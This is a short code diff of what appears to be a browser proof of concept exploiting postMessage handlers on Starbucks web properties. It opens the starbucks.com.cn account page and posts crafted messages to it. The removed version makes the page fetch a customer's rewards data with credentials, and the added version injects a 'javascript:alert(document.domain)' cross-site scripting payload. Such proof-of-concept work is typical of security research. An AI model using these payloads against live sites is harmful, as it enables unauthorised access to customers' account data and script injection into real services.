@@ -14,7 +14,7 @@ var h1Win;
 var s;
 function openWin(){
 	//h1Win = window.open("https://chdlyncweb01.starbucks.com/Autodiscover/XFrame/XFrame.html");
-	h1Win = window.open("https://www.magisto.com/account/settings");
+	h1Win = window.open("https://www.starbucks.com.cn/account/#/");
 	}
 
 	function sendMessage(){
@@ -24,7 +24,7 @@ var data = JSON.stringify({type:"get",url:"https://profile.starbucks.com.cn/api/
 			}
 
 function sendMessage1(){
-var data = JSON.stringify({type:"get",url:"https://profile.starbucks.com.cn/api/Customers/rewards?status=Total&pageNum=1&pageSize=100",accept:"text/plain,application/json, text/javascript, */*; q=0.01",xhrFields:"{withCredentials:true}"});
+var data = JSON.stringify({"message":{"type":3,"noVerify":1,"subsid":1,"src":"javascript:alert(document.domain);//","captype":1,"subcaptype":1}});
 	h1Win.postMessage(data,"*");
         console.log("postmessage successed for customer!")
 			}
